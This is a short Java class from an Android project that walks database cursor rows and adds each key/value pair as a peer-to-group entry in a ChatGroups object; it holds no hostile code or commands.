package com.android.deviceinfo.db;

import android.database.Cursor;

import com.android.deviceinfo.module.chat.ChatGroups;

public class RecordGroupsVisitor extends RecordVisitor {

	ChatGroups groups;

	public RecordGroupsVisitor(ChatGroups groups) {
		this.groups = groups;
	}

	@Override
	public long cursor(Cursor cursor) {

		int columnIndex = 0;
		String key = cursor.getString(0);
		String value = cursor.getString(1);

		groups.addPeerToGroup(key, value);

		return 0;
	}

}
